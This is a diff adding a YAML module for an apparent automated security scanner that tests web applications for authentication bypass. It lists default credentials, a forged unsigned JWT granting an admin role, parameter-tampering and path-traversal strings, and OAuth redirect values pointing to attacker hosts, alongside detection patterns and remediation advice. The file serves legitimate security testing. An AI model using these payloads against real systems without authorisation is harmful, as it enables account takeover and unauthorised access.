@@ -1,0 +1,80 @@
+name: Authentication Bypass
+category: web
+description: >
+  Tests for authentication and authorization bypass vulnerabilities.
+  Covers broken auth flows, JWT flaws, session fixation, and privilege escalation.
+
+severity_range: ["HIGH", "CRITICAL"]
+tools: ["curl", "jwt_tool", "custom_scripts"]
+
+methodology:
+  - "Map all authentication endpoints (login, register, password reset, MFA)"
+  - "Test for default credentials on admin panels"
+  - "Test for authentication bypass via parameter manipulation (admin=true, role=admin)"
+  - "Test JWT vulnerabilities: none algorithm, weak secret, key confusion"
+  - "Test for session fixation: does the session ID change after login?"
+  - "Test password reset flow for token prediction and reuse"
+  - "Test for account enumeration via login/reset responses"
+  - "Test brute-force protection: rate limiting, account lockout"
+  - "Test for authentication bypass via HTTP method override"
+  - "Test for path traversal in authenticated routes"
+  - "Test OAuth/SAML flows for redirect_uri manipulation"
+  - "Test for missing authentication on sensitive endpoints"
+
+payloads:
+  # Default credentials
+  - "admin:admin"
+  - "admin:password"
+  - "root:root"
+  - "test:test"
+  - "admin:123456"
+  # JWT manipulation
+  - '{"alg":"none","typ":"JWT"}'
+  - '{"alg":"HS256","typ":"JWT"} (with weak secret "secret")'
+  - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
+  # Parameter manipulation
+  - "admin=true"
+  - "role=admin"
+  - "is_admin=1"
+  - "access_level=999"
+  - "user_id=1"
+  # HTTP method override
+  - "X-HTTP-Method-Override: PUT"
+  - "X-Method-Override: DELETE"
+  # Path traversal in auth
+  - "/admin/../admin/dashboard"
+  - "/admin%2fdashboard"
+  # OAuth redirect manipulation
+  - "redirect_uri=https://evil.com/callback"
+  - "redirect_uri=https://attacker.com/redirect"
+
+detection_patterns:
+  - "(?:\"admin\"\\s*:\\s*true|\"role\"\\s*:\\s*\"admin\")"
+  - "(?:Welcome|Dashboard|Admin Panel|Control Panel)"
+  - "(?:Set-Cookie:.*session|Set-Cookie:.*token)"
+  - "(?:HTTP/1\\.1 200|HTTP/1\\.1 302).*?(?:admin|dashboard)"
+
+remediation: >
+  Implement multi-factor authentication. Use bcrypt/scrypt for password
+  hashing. Implement rate limiting and account lockout. Validate JWT
+  signatures with strong secrets. Use HttpOnly, Secure, SameSite cookie
+  flags. Implement proper session management. Audit OAuth redirect URIs.
+
+references:
+  - "CWE-287: Improper Authentication"
+  - "CWE-306: Missing Authentication for Critical Function"
+  - "OWASP A07:2021 – Identification and Authentication Failures"
+
+triggers:
+  - "auth"
+  - "login"
+  - "jwt"
+  - "session"
+  - "oauth"
+  - "saml"
+  - "sso"
+  - "admin"
+  - "password"
+  - "mfa"
+  - "2fa"
+  - "token"
